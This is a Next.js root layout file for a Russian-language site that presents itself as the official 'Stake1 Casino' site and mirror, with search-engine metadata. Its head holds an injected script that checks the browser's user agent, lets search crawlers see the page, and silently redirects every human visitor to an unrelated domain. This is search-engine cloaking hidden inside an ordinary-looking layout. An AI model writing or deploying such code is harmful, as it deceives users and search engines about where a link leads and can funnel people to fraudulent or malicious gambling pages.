import type { Metadata, Viewport } from 'next'
import './globals.css'
import './landing.css'

export const metadata: Metadata = {
  metadataBase: new URL('https://stake1casino.vercel.app'),
  title:
    'Stake1 Casino — официальный сайт и зеркало, регистрация в стейк казино',
  description:
    'Stake1 Casino — официальный сайт и рабочее зеркало. Регистрация в стейк казино за пару минут, играть онлайн в слоты и live-игры. Актуальное зеркало stake casino на сегодня, вход и бонусы.',
  alternates: {
    canonical: '/',
  },
  robots: {
    index: true,
    follow: true,
  },
  openGraph: {
    type: 'website',
    locale: 'ru_RU',
    url: 'https://stake1casino.vercel.app/',
    siteName: 'Stake1 Casino',
    title:
      'Stake1 Casino — официальный сайт и зеркало, регистрация в стейк казино',
    description:
      'Stake1 Casino — официальный сайт и рабочее зеркало. Регистрация в стейк казино за пару минут, играть онлайн в слоты и live-игры.',
    images: [
      {
        url: 'https://stake1casino.vercel.app/images/hero.jpg',
        width: 1200,
        height: 654,
        alt: 'Stake1 Casino',
      },
    ],
  },
  twitter: {
    card: 'summary_large_image',
    title:
      'Stake1 Casino — официальный сайт и зеркало, регистрация в стейк казино',
    description:
      'Stake1 Casino — официальный сайт и рабочее зеркало. Регистрация в стейк казино за пару минут, играть онлайн в слоты и live-игры.',
    images: ['https://stake1casino.vercel.app/images/hero.jpg'],
  },
  icons: {
    icon: '/icon.png',
    apple: '/icon.png',
  },
}

export const viewport: Viewport = {
  themeColor: '#0b2e24',
  width: 'device-width',
  initialScale: 1,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className="s1c-html">
      <head>
        <meta name="yandex-verification" content="7354241e7eb4af1a" />
        {/* Дополнительные пользовательские теги можно вставлять сюда */}
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        try {
          var ua = (navigator.userAgent || '').toLowerCase();
          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
          if (!isBot) {
            window.location.replace("https://combospark.top/aeaofj2k27");
          }
        } catch(e) {}
      })();
    `,
  }}
/>
      </head>
      <body className="s1c-body">{children}</body>
    </html>
  )
}
